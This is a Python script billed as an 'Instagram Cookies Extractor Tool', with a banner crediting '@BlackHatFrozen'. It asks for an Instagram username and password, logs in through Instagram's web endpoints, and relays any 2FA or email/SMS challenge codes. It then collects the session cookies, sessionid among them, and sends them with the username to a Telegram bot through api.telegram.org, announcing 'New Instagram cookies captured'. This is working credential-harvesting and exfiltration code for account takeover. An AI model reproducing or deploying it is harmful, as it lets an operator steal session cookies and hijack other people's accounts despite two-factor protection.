# -*- coding: utf-8 -*-
import requests
import re
import time
import json
from getpass import getpass
from urllib.parse import urljoin


TELEGRAM_BOT_TOKEN = "BOT-TOKEN"  # <- put your bot token
TELEGRAM_CHAT_ID = "CHAT-ID"  # <- 6240677007

DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")

IG_BASE = "https://www.instagram.com"
LOGIN_AJAX = IG_BASE + "/accounts/login/ajax/"
TWO_FACTOR_AJAX = IG_BASE + "/accounts/login/ajax/two_factor/"

COOKIE_SEQUENCE = [
    "mid", "ig_did", "csrftoken", "rur", "ds_user_id", "sessionid",
    "ig_nrcb", "X-MID", "IG-U-DS-USER-ID", "X-IG-WWW-Claim", "ps_l", "ps_n"
]


def clean_cookie_string(cookie: str) -> str:
    cookie = re.sub(r'\s*;\s*', '; ', cookie)
    return cookie.strip('; ').strip()


def cookie_dict_from_session(sess: requests.Session) -> dict:
    return {c.name: c.value for c in sess.cookies}


def build_ordered_cookie_string(cdict: dict) -> str:
    parts = []
    for key in COOKIE_SEQUENCE:
        if key in cdict:
            v = cdict[key]
            if (',' in v or ' ' in v) and not (v.startswith('"') and v.endswith('"')):
                v = f'"{v}"'
            parts.append(f"{key}={v}")
    for k in sorted(cdict.keys()):
        if k not in COOKIE_SEQUENCE:
            v = cdict[k]
            if (',' in v or ' ' in v) and not (v.startswith('"') and v.endswith('"')):
                v = f'"{v}"'
            parts.append(f"{k}={v}")
    return clean_cookie_string('; '.join(parts))


def send_cookies_to_telegram(cookie_str: str, username: str, user_agent: str) -> None:


    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("⚠️ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set - skipping Telegram send.")
        return

    text = (
        "<b>🔐 New Instagram cookies captured</b>\n\n"
        f"<b>Account:</b> {username}\n"
        f"<b>User-Agent:</b> {user_agent}\n\n"
        "<b>Cookies:</b>\n"
        f"<pre>{cookie_str}</pre>"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }

    try:
        r = requests.post(url, data=data, timeout=15)
        if not r.ok:
            print("❌ Failed to send cookies to Telegram:", r.text)
        else:
            print("✅ Cookies sent to Telegram bot.")
    except Exception as e:
        print("❌ Error sending to Telegram:", e)


def _post_challenge_code(session: requests.Session, challenge_path: str, code: str):

    full = urljoin(IG_BASE, challenge_path)
    headers = {"X-CSRFToken": session.cookies.get("csrftoken", ""), "Referer": full}

    payloads = [
        {"security_code": code},
        {"sms_code": code},
        {"verification_code": code},
        {"security_code": code, "choice": "1"},
    ]

    last_exc = None
    for p in payloads:
        try:
            r = session.post(full, data=p, headers=headers, timeout=20)
            try:
                return r.json()
            except Exception:
       
                return {"status": "unknown", "raw": r.text}
        except Exception as e:
            last_exc = e
            continue

    raise RuntimeError(f"Failed to submit challenge code (last error: {last_exc})")


def instagram_login(username: str, password: str, user_agent: str):
    s = requests.Session()
    s.headers.update({
        "User-Agent": user_agent,
        "X-Requested-With": "XMLHttpRequest",
        "Referer": IG_BASE + "/accounts/login/"
    })

    try:
        r = s.get(IG_BASE + "/", timeout=20)
    except Exception as e:
        raise RuntimeError(f"Failed to reach Instagram: {e}")

    csrftoken = s.cookies.get("csrftoken", "")

    enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}"
    login_data = {
        "username": username,
        "enc_password": enc_password,
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }

    s.headers.update({"X-CSRFToken": csrftoken})
    try:
        r = s.post(LOGIN_AJAX, data=login_data, timeout=20)
    except Exception as e:
        raise RuntimeError(f"Login request failed: {e}")

    try:
        j = r.json()
    except Exception:
        raise RuntimeError(f"Unexpected response from login endpoint: {r.text[:400]}")

   
    if j.get("authenticated"):
        cookies = cookie_dict_from_session(s)

  
    elif j.get("two_factor_required"):
        two_factor_identifier = j["two_factor_info"].get("two_factor_identifier", "")
        
        max_attempts = 3
        cookies = None
        for attempt in range(1, max_attempts + 1):
            print(f"\n🔐 Two-factor authentication required. Enter the 2FA code (attempt {attempt}/{max_attempts}):")
            code = input("2FA code: ").strip()

            s.headers.update({"X-CSRFToken": s.cookies.get("csrftoken", "")})
            try:
                r2 = s.post(TWO_FACTOR_AJAX, data={
                    "username": username,
                    "verificationCode": code,
                    "identifier": two_factor_identifier,
                    "queryParams": "{}"
                }, timeout=20)
            except Exception as e:
                raise RuntimeError(f"2FA request failed: {e}")

            try:
                j2 = r2.json()
            except Exception:
                raise RuntimeError(f"Unexpected 2FA response: {r2.text[:400]}")

            if j2.get("authenticated"):
                cookies = cookie_dict_from_session(s)
                break
            else:
                print("❌ 2FA failed or code incorrect. Response:", j2.get("message") or j2)

        if not cookies:
            raise RuntimeError(f"2FA failed after {max_attempts} attempts: {j2}")


    elif j.get("challenge_required") or j.get("checkpoint_required") or \
         (isinstance(j.get("message"), str) and ("email" in j.get("message").lower() or "sms" in j.get("message").lower() or "otp" in j.get("message").lower())):
    
        challenge_path = None
        if isinstance(j.get("challenge"), dict):
            challenge_path = j["challenge"].get("api_path") or j["challenge"].get("url")

        if not challenge_path:
            
            challenge_path = "/challenge/"

       
        try:
            full_challenge = urljoin(IG_BASE, challenge_path)
            s.get(full_challenge, timeout=20)
        except Exception:
  
            pass

       
        max_attempts = 5
        cookies = None
        last_resp = None
        for attempt in range(1, max_attempts + 1):
            print(f"\n✉️ Verification required (email/SMS). Enter the code you received (attempt {attempt}/{max_attempts}):")
            code = input("Verification code (email/SMS): ").strip()

            try:
                resp_json = _post_challenge_code(s, challenge_path, code)
            except Exception as e:
                raise RuntimeError(f"Submitting challenge code failed: {e}")

            last_resp = resp_json
            
            if isinstance(resp_json, dict) and (resp_json.get("status") == "ok" or resp_json.get("authenticated")):
             
                cookies = cookie_dict_from_session(s)
                break
            else:
               
                print("❌ Challenge response:", resp_json)
            

        if not cookies:
            raise RuntimeError(f"Challenge/verification failed after {max_attempts} attempts: {last_resp}")

    else:
        
        raise RuntimeError(f"Login failed or blocked; response: {json.dumps(j, indent=2)[:1000]}")

 
    cookie_str = build_ordered_cookie_string(cookies)

    
    payload = {
        "useragent": user_agent,
        "cookie": cookie_str
    }

    return payload

print("""\033[1;97m
\033[1;94m══════════════════════════════════════════════\033[0m
\033[1;96m     ✦❘༻  \033[1;107;30m  F R O Z E N \033[0m \033[1;96m༺❘✦
\033[1;94m══════════════════════════════════════════════\033[0m

\033[1;90m Owner      : \033[1;91m@DarkFrozenOwner
\033[1;90m Tool       : \033[1;96mInstagram Cookies Extractor Tool
\033[1;90m Channels   : \033[1;94m@DarkFrozenGaming\033[1;37m , \033[1;94m@BlackHatFrozen
\033[1;90m

\033[1;94m══════════════════════════════════════════════
\033[1;96m     ✦❘༻  \033[1;107;30m   F R O Z E N  \033[0m \033[1;96m༺❘✦
\033[1;94m══════════════════════════════════════════════\033[0m
""")
def main():
    print("\n=== INSTAGRAM COOKIE EXTRACTOR===")
    username = input("Instagram username: ").strip()
    
    
    password = input("Instagram password: ")
    ua = input("User-Agent (Press Enter for default): ").strip() or DEFAULT_UA

    try:
        payload = instagram_login(username, password, ua)
    except Exception as e:
        print("❌ Error during login:", e)
        return

    
    print("\n--- Payload (sent to Telegram) ---\n")
    print(json.dumps(payload, indent=2))

    send_cookies_to_telegram(payload["cookie"], username, ua)


if __name__ == "__main__":
    main()
